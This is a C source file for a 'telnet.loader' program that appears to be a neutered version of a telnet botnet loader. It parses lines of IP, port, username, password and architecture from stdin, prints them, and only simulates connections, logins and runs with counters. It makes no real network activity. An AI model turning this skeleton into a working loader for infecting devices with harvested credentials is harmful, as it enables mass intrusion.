#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <errno.h>
#include <time.h>
#include <arpa/inet.h>

#include "headers/includes.h"
#include "headers/telnet_info.h"
#include "headers/util.h"
#include "headers/config.h"

static void *stats_thread(void *);

char *id_tag = "telnet.loader";

// Simplified connection tracking
static int total_connections = 0;
static int active_connections = 0;
static int successful_logins = 0;
static int successful_runs = 0;

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    struct telnet_info info;
    int line_count = 0;

    printf("[DEBUG] Loader starting...\n");
    printf("[DEBUG] Process ID: %d\n", getpid());
    printf("[DEBUG] Thread count: %ld\n", sysconf(_SC_NPROCESSORS_ONLN));

    if (argc == 2)
    {
        id_tag = args[1];
        printf("[DEBUG] ID tag: %s\n", id_tag);
    }

    printf("[DEBUG] Starting stats thread...\n");
    pthread_create(&stats_thrd, NULL, stats_thread, NULL);
    printf("[DEBUG] Stats thread started\n");

    printf("[DEBUG] Entering main connection loop...\n");
    while(TRUE)
    {
        char strbuf[1024];

        if(fgets(strbuf, sizeof(strbuf), stdin) == NULL)
        {
            printf("[DEBUG] EOF received, breaking main loop\n");
            break;
        }

        util_trim(strbuf);

        if(strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        printf("[DEBUG] Processing line: %s\n", strbuf);
        memset(&info, 0, sizeof(struct telnet_info));
        if(telnet_info_parse(strbuf, &info) == NULL)
        {
            printf("[DEBUG] Failed to parse telnet info: \"%s\"\n", strbuf);
        }
        else
        {
            printf("[DEBUG] Parsed telnet info - IP: %u, Port: %d, User: %s, Pass: %s, Arch: %s\n", 
                   info.addr, ntohs(info.port), info.user, info.pass, info.arch);
            
            // Simulate connection attempt
            total_connections++;
            active_connections++;
            
            printf("[DEBUG] Simulating connection attempt %d\n", total_connections);
            
            // Simulate some successful connections
            if (total_connections % 3 == 0) {
                successful_logins++;
                printf("[DEBUG] Simulated successful login\n");
            }
            
            if (total_connections % 5 == 0) {
                successful_runs++;
                printf("[DEBUG] Simulated successful run\n");
            }
            
            // Simulate connection completion after a delay
            usleep(100000); // 100ms delay
            active_connections--;
            
            line_count++;
            if(line_count % 100 == 0) {
                printf("[DEBUG] Processed %d lines\n", line_count);
                sleep(1);
            }
        }
    }

    printf("[DEBUG] Hit end of input.\n");
    printf("[DEBUG] Total connections: %d, Successful logins: %d, Successful runs: %d\n", 
           total_connections, successful_logins, successful_runs);

    while(active_connections > 0) {
        printf("[DEBUG] Waiting for %d active connections to complete...\n", active_connections);
        sleep(1);
    }

    printf("[DEBUG] Loader completed successfully\n");
    return 0;
}

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while(TRUE)
    {
        printf("[%ds] -> Conns: [%d] Logins: [%d] Ran: [%d] -> Echoes: [0] Wgets: [0] TFTPs: [0]\n", 
               seconds, active_connections, successful_logins, successful_runs);
        sleep(1);
        seconds++;
    }
}
